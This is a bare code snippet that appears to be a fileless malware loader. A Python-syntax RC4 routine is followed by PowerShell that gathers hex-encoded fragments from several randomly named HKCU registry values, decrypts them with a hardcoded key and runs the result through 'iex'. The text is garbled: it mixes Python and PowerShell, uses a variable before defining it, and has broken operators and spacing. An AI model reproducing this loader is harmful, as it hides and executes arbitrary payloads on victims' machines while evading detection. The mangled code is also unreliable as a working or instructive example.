def encr(data, key):
    buf = data.copy()

    s = [None for _ in range(256)]
    k = [None for _ in range(256)]

    for i in range(0, 256):
        s[i] = i
        k[i] = key[i % len(key)]

    j = 0
    for i in range(0, 256):
        j = (j + s[i] + k[i]) % 256
        temp = s[i]
        s[i] = s[j]
        s[j] = temp

    i = j = 0
    for x in range(len(buf)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
        t = int((s[i] + s[j]) % 256)
        buf[x] = buf[x] ^ s[t]

    return buf


function HexToBin {
    param(
        [Parameter(
            Position=0,
            Mandatory=$true,
            ValueFromPipeline=$true)
         ]
        [string]$s)
    $return = @()

    for ($i=0
         $i - lt $s.Length
         $i += 2)
    {$return += [Byte]:: Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]: : HexNumber)
     }

    Write-Output $return
}

[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty - Path HKCU: \SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted2 = (Get-ItemProperty - Path HKCU: \SOFTWARE\BjqAtIen).uLltjjW
$encrypted3 = (Get-ItemProperty - Path HKCU: \SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted4 = (Get-ItemProperty - Path HKCU: \SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted5 = (Get-ItemProperty - Path HKCU: \AppEvents\Jx66ZG0O).jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]: : ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString | iex
